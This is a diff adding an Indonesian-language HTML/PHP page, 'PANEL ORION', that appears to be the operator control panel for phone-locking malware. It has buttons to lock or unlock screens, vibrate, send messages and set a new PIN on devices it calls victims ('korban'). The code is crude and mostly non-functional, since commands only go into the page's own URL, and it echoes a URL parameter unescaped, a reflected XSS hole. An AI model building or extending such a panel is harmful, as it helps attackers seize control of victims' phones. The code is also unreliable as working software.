@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>⚫ PANEL ORION ⚫</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
+h1{text-align:center;border:1px solid #0f0;}
+.card{border:1px solid #0f0;padding:10px;margin:10px 0;}
+.btn{background:#f00;color:white;padding:10px;border:none;margin:5px;cursor:pointer;font-size:16px;}
+.btn-green{background:#0a0;}
+input{padding:10px; width:150px; background:#222; border:1px solid #0f0; color:#fff;}
+</style>
+</head>
+<body>
+
+<h1>=== CONTROL CENTER ===</h1>
+
+<h2>🔌 DEVICE ONLINE:</h2>
+<div id="deviceList">Menunggu koneksi...</div>
+
+<h2>⚡ CONTROL LOCK:</h2>
+<button class="btn" onclick="kirim('LOCK_SCREEN_ON')">🔴 LOCK ON</button>
+<button class="btn btn-green" onclick="kirim('LOCK_SCREEN_OFF')">🟢 LOCK OFF</button>
+
+<h2>⚡ FITUR LAIN:</h2>
+<button class="btn" onclick="kirim('VIBRATE')">📳 GETAR</button>
+<br><br>
+
+<input type="text" id="pesan" placeholder="Tulis pesan...">
+<button class="btn" onclick="kirimPesan()">💬 KIRIM PESAN</button>
+<br><br>
+
+<input type="text" id="pinbaru" placeholder="PIN BARU (4 ANGKA)" maxlength="4">
+<button class="btn" style="background:blue" onclick="gantiPin()">🔑 GANTI PIN</button>
+
+<script>
+// SIMPAN DATA DI LOCALSTORAGE (GANTI PHP)
+function saveData(){
+    let device = "HP: " + navigator.userAgent;
+    let time = new Date().toLocaleTimeString();
+    let data = localStorage.getItem("log") || "";
+    localStorage.setItem("log", "["+time+"] | "+device+"\n"+data);
+    tampilData();
+}
+
+function tampilData(){
+    document.getElementById("deviceList").innerHTML = localStorage.getItem("log") || "Belum ada korban";
+}
+
+// KIRIM PERINTAH (SIMPAN DI FILE COMMAND VIA URL)
+function kirim(perintah){
+    // Kita simpan perintah di parameter URL biar kebaca
+    let url = window.location.href + "?cmd=" + perintah;
+    history.pushState({}, "", url);
+    alert("Perintah: " + perintah + " DIKIRIM!");
+}
+
+function kirimPesan(){
+    let teks = document.getElementById("pesan").value;
+    kirim("MSG:"+teks);
+}
+
+function gantiPin(){
+    let pin = document.getElementById("pinbaru").value;
+    if(pin.length == 4){
+        kirim("SETPIN:"+pin+"|");
+    }else{
+        alert("PIN HARUS 4 ANGKA!");
+    }
+}
+
+// LOAD
+window.onload = function(){
+    tampilData();
+    // Auto save data dummy
+    saveData();
+}
+</script>
+
+<!-- AREA UNTUK BACA PERINTAH -->
+<div id="cmdArea" style="display:none">
+<?php if(isset($_GET['cmd'])) echo $_GET['cmd']; ?>
+</div>
+
+</body>
+</html>
